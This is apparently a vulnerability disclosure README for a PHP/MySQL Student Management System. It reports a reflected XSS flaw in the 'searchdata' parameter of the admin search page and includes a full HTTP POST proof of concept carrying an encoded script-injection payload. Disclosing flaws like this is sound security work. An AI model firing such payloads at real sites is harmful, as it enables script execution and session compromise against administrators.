# Student Management System

A Student Management System developed using PHP and MySQL.

## Auditor

Shoaib Alam - [LinkedIn Profile](https://www.linkedin.com/in/shoaib-alam-b53843203/)

## Description

### Cross-Site Scripting (XSS) Vulnerability in Admin Panel

A Cross-Site Scripting (XSS) vulnerability has been identified in the Student Management System. Specifically, this issue is present in the admin panel's student search functionality.

The web application fails to adequately sanitize user input on the admin page, particularly within the `searchdata` parameter of the `/studentms/admin/search.php` endpoint. This lack of proper input sanitization allows for the injection and execution of arbitrary scripts within the victim's browser context when they interact with a specially crafted link. Such a vulnerability can lead to significant security risks, including unauthorized script execution and potential data exposure.

**Vulnerable Endpoint:** `/studentms/admin/search.php`  
**Vulnerable Parameter:** `searchdata`

## Proof of Concept (PoC)

The following HTTP request demonstrates the XSS vulnerability. This PoC illustrates how an attacker could exploit the vulnerability to execute arbitrary JavaScript in the victim's browser.

```http
POST /studentms/admin/search.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Origin: http://localhost
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://localhost/studentms/admin/search.php
Cookie: PHPSESSID=kq90r1jv25kn4flrqd74v1miqd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

searchdata=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&search=
